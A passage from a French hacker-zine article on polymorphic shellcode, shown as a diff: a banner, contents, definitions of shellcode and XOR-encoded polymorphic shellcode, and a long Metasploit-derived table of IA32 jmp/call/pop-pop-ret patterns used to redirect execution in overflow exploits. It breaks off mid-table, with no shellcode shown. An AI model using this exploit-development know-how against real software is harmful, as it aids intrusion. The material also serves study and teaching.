@@ -1,0 +1,3759 @@
+ 	                                          __ 	             _                                  _     _   
+	                                         / _|	            | |                                | |   (_)                
+	 ___ _   _ _ ____   _____ _   _     ___ | |_ 	 _ __   ___ | |_   _ _ __ ___   ___  _ __ _ __ | |__  _  ___          
+	/ __| | | | '__\ \ / / _ \ | | |   / _ \|  _|	| '_ \ / _ \| | | | | '_ ` _ \ / _ \| '__| '_ \| '_ \| |/ __|
+	\__ \ |_| | |   \ V /  __/ |_| |  | (_) | |  	| |_) | (_) | | |_| | | | | | | (_) | |  | |_) | | | | | (__ 
+	|___/\__,_|_|    \_/ \___|\__, |   \___/|_| 	| .__/ \___/|_|\__, |_| |_| |_|\___/|_|  | .__/|_| |_|_|\___|
+                       	           __/ |            	| |             __/ |                    | | 
+				  |___/          	|_|            |___/                     |_|  
+   		
+    
+                                        _          _ _               _      
+                                       | |        | | |             | |     
+                                    ___| |__   ___| | | ___ ___   __| | ___ 
+                                   / __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \
+                                   \__ \ | | |  __/ | | (_| (_) | (_| |  __/
+                                   |___/_| |_|\___|_|_|\___\___/ \__,_|\___|
+ 
+
+
+
+                                    
+
+    -- [ survey of polymorphic shellcode
+
+
+
+	---[ 01 ]  introduction.
+	---[ 02 ]  définitions des termes, instructions etc.
+	---[ 03 ]  retour au moyen-âge.
+	---[ 04 ]  shellcoding - traditionnel execve.
+	---[ 05 ]  shellcoding - C coding
+	---[ 06 ]  shellcoding - get the rewt.
+	---[ 07 ]  shellcoding - asm coding.
+	---[ 08 ]  shellcoding - polymorphic
+	---[ 09 ]  coding - PSE - Polymorphic Shellcode Engine.
+	---[ 10 ]  exemples avec PSE.
+	---[ 11 ]  technics & methods
+	---[ 12 ]  annexe - buffer overflow exploitation.
+	---[ 13 ]  references.
+	---[ 14 ]  auteurs.
+	---[ 15 ]  conclusion.
+
+
+   [Begin...] 
+
+
+	---[ 01 ]   Introduction.
+
+Houpla, je savais pas trop quoi écrire pour le nnl-mag, j'ai alors décidé de faire
+quelque chose sur les shellcodes. Dans cet article, il est indispensable de
+connaitre le C et l'asm, nous retournerons au moyen-âge pour ceux qui ne connaissent
+pas du tout l'asm, ce qui est déjà vraiment dommage. 
+C'est alors là, que nous partirons du shellcode type execve() crée par AlephOne au
+shellcode polymorphique en passant par les techniques utiles afin de mieux shellcoder.
+Je tenais aussi à dire que cet article venait de mon bloc-note numérique (là où je
+fais des ptits tests par ci par là).
+
+Bonne lecture.
+
+
+
+	---[ 02 ]   Définitions des termes, instructions ...
+
+
+- shellcode : De manière générale, on utilise un shellcode dans  un exploit, c'est
+	      là son veritable objectif. Ce  que l'on recherche principalement avec
+	      le shellcode,  c'est exécuter du code arbitraire, plus globalement le
+	      shellcode va exécuter  par exemple /bin/sh  une fois que l'on a ecrasé
+	      l'adresse  du  retour  d'une  fonction  vulnérable... Plus directement,
+	      un shellcode lance un shell, mais il peut à la base être programmé en
+	      C et désassemblé avec gdb ou pour ceux qui ne codent  pas du tout  en
+	      asm, il est forgé si vous le souhaitez par différents générateurs de
+	      shellcodes. Finalement, on l'intégre en  hexadecimal  généralement dans
+	      le code  d'un exploit. Il contient  une série d'instructions en asm et
+	      qui seront interprétées et exécutées.
+	      Il est intégré en héxadecimal pour que le shellcode soit exécuté, pour
+	      ce  faire, il faut placer un code qui partira avec les privilèges du
+	      processus courant. Et donc, le shellcode doit être en langage machine
+	      pour que notre code injecté dans la mémoire  du processus soit exécuté !
+	      Alors  on  peut  donc  faire exécuter  à peu pres  n'importe quelle
+	      instruction via ces shellcodes, et c'est justement le thème de cet
+	      article, c'est-à-dire, savoir faire à peu près tout et n'importe quoi
+	      en matière de shellcode.
+
+
+
+- shellcode pour overflows : Ca reste un shellcode, mais ne contient pas de null bytes.
+			     La notion d'overflow désigne pour ceux qui ne l'avaient pas
+			     compris les différents buffer overflow, stack overflow, kernel
+			     overflow, heap overflow, integer overflow, format string.
+			     Nous traiterons cette partie très vaguement à la fin de
+			     cet article.
+
+- polymorphique shellcode : Ceci est un shellcode qui utilise par exemple le chiffrement
+                            XOR, il sera donc "crypté", cette méthode était au départ
+                            utilisée pour les virus, elle est aujourd'hui aussi utilisée 
+                            pour les shellcodes. Pour ceci, nous ferons de même des 
+                            exemples pratiques sur la création manuelle de shellcode, avec
+	                    principalement la théorie de cette methode, à quoi sert-elle,
+			    voir de même les notions de crypteur (encode) ou decrypteur
+                            (decode). Je vous conseille notament de lire l'article du
+		            groupe CLET Team sur les shellcodes polymorphiques dans le
+                            p61, de même regardez le code du programme ADMutate de k2,
+                            parce que rien ne vaut lire un code =). C'est ici que vous
+                            trouverez les meilleurs références sur ceci, si vous avez
+                            l'intention de vous coder un moteur (de mutation?) polymorphe.
+			    
+
+- opcode : Pour reprendre la définition de jargon-truc, un opcode est un code d'opération.
+	   En général, c'est le numéro qui identifie une fonction dans une bibliothèque,
+	   ou une instruction parmi celles qui constituent le jeu d'instructions d'un 	   	
+           processeur.
+
+	Voici une liste des opcodes sur architecture IA32 trouvée sur metasploit, j'ai pensé
+	que je pourrais le mettre dans l'article :
+
+  ------------------------------------------------------------------------------------------------
+ |	      Type              |          Groupe	        |           Meta Type             |
+  ------------------------------------------------------------------------------------------------
+ |	jmp eax 		|	eax => eip 		|	jmp reg                   |	
+ |	call eax 		|	eax => eip 		|	call reg 	          |
+ |	push eax, ret    	|	eax => eip 		|	push reg/ret 	          |
+ |	jmp ebx 		|	ebx => eip 		|	jmp reg 	          |
+ |	call ebx 		|	ebx => eip 		|	call reg 	          |
+ |	push ebx, ret    	|	ebx => eip 		|	push reg/ret 	          |
+ |	jmp ecx 		|	ecx => eip 		|	jmp reg 	          |
+ |	call ecx 		|	ecx => eip 		|	call reg 	          |
+ |	push ecx, ret    	|	ecx => eip 		|	push reg/ret 	          |
+ |	jmp edx 		|	edx => eip 		|	jmp reg 	          |
+ |	call edx 		|	edx => eip 		|	call reg 	          |
+ |	push edx, ret    	|	edx => eip 		|	push reg/ret 	          |
+ |	jmp edi 		|	edi => eip 		|	jmp reg 	          |
+ |	call edi 		|	edi => eip 		|	call reg 	          |
+ | 	push edi, ret   	|	edi => eip 		|	push reg/ret 	          |
+ |	jmp esi 		|	esi => eip 		|	jmp reg 	          |
+ |	call esi 		|	esi => eip 		|	call reg 	          |
+ |	push esi, ret    	|	esi => eip 		|	push reg/ret 	          |
+ |	jmp ebp 		|	ebp => eip 		|	jmp reg 	          |
+ |	call ebp 		|	ebp => eip 		|	call reg 	          |
+ |	push ebp, ret    	|	ebp => eip 		|	push reg/ret 	          |
+ |	jmp esp 		|	esp => eip 		|	jmp reg 	          |
+ |	call esp 		|	esp => eip 		|	call reg 	          |
+ |	push esp, ret    	|	esp => eip 		|	push reg/ret 	          |
+ |	pop eax, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop eax, pop ebx, ret   |  	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop eax, pop ecx, ret   |  	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop ebx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop ecx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop ebx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop ecx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop ebx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop ecx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop ebx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop ecx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop ebx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop ecx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop ebx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop ecx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop eax, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop ebx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop ecx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop edx, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop edi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop esi, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop ebp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop esp, ret   | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop eax, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop ebx, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop ebx, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop ebx, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ | 	pop ebx, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebx, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ecx, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edx, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop edi, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esi, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop ebp, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop eax, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop ebx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop ecx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop edx, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop edi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop esi, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop ebp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	pop esp, pop esp, retn  | 	[esp + 8] => eip 	|	pop/pop/ret               | 	
+ |	jmp [eax + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [eax + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebx + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ecx + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edx + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [edi + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esi + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [ebp + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 0] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 4] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 8] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	call [eax + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [eax + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebx + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ecx + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edx + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [edi + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esi + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebp + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebp + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
